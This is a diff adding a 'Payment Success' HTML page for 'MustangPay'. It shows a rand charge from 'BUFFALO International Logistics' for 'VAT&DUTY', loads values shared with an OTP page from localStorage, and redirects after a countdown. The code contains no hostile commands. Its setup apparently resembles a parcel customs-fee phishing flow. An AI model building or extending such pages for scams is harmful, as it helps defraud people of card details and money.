@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment Success</title>
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  background:linear-gradient(180deg,#fff5ec,#ffe7d6);
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  min-height:100vh;
+  padding:40px 20px;
+}
+.container{
+  width:100%;
+  max-width:380px;
+  text-align:center;
+}
+.logo img{
+  height:28px;
+  margin-bottom:18px;
+}
+.card{
+  background:#fff;
+  border-radius:18px;
+  padding:24px 20px;
+  box-shadow:0 6px 18px rgba(0,0,0,0.08);
+}
+.check{
+  width:64px;
+  height:64px;
+  border-radius:50%;
+  background:#e8f7ef;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 14px;
+}
+.check span{
+  color:#1aa56b;
+  font-size:32px;
+  font-weight:700;
+}
+.success{
+  color:#1aa56b;
+  font-size:18px;
+  font-weight:600;
+  margin-bottom:6px;
+}
+.amount{
+  font-size:26px;
+  font-weight:700;
+  margin-bottom:18px;
+}
+.details{
+  text-align:left;
+  font-size:14px;
+}
+.row{
+  display:flex;
+  justify-content:space-between;
+  margin:8px 0;
+  color:#555;
+}
+.row strong{
+  color:#000;
+}
+.btn{
+  margin-top:20px;
+  width:100%;
+  padding:14px;
+  font-size:16px;
+  font-weight:600;
+  border-radius:14px;
+  border:1px solid #000;
+  background:#fff;
+  cursor:pointer;
+}
+.redirect{
+  margin-top:14px;
+  font-size:13px;
+  color:#777;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+
+  <div class="logo">
+    <img src="img/MstgPay2.png" alt="MustangPay">
+  </div>
+
+  <div class="card">
+    <div class="check"><span>✓</span></div>
+    <div class="success">Payment Success!</div>
+    <div class="amount" id="amount">R0.00</div>
+
+    <div class="details">
+      <div class="row"><span>Merchant</span><strong id="merchant"></strong></div>
+      <div class="row"><span>Reference</span><strong id="reference"></strong></div>
+      <div class="row"><span>Order Number</span><strong id="order"></strong></div>
+      <div class="row"><span>Remark</span><strong id="remark"></strong></div>
+      <div class="row"><span>Payment Time</span><strong id="time"></strong></div>
+      <div class="row"><span>Payment Method</span><strong>Card Payment</strong></div>
+    </div>
+
+    <button class="btn" onclick="window.close()">Close</button>
+
+    <div class="redirect">
+      Redirecting in <span id="countdown">53</span> seconds...
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ===============================
+   DATA (shared with OTP page)
+================================ */
+
+// fallback values if not set
+const orderNumber = localStorage.getItem("orderNumber") || "3467196895858310";
+const remark      = localStorage.getItem("remark") || "BUFZA8JA16192GRYQ-VAT&DUTY";
+const amount      = localStorage.getItem("amount") || "211.37";
+const reference   = localStorage.getItem("reference") || "260127011104248181057011";
+
+document.getElementById("amount").textContent = `R${amount}`;
+document.getElementById("merchant").textContent = "BUFFALO International Logistics";
+document.getElementById("reference").textContent = reference;
+document.getElementById("order").textContent = orderNumber;
+document.getElementById("remark").textContent = remark;
+document.getElementById("time").textContent =
+  new Date().getFullYear() + "-" +
+  String(new Date().getMonth()+1).padStart(2,"0") + "-" +
+  String(new Date().getDate()).padStart(2,"0") + " " +
+  String(new Date().getHours()).padStart(2,"0") + ":" +
+  String(new Date().getMinutes()).padStart(2,"0");
+
+/* ===============================
+   REDIRECT COUNTDOWN
+================================ */
+let seconds = 53;
+const cd = document.getElementById("countdown");
+const timer = setInterval(()=>{
+  seconds--;
+  cd.textContent = seconds;
+  if(seconds <= 0){
+    clearInterval(timer);
+    window.location.href = "/";
+  }
+},1000);
+</script>
+
+</body>
+</html>
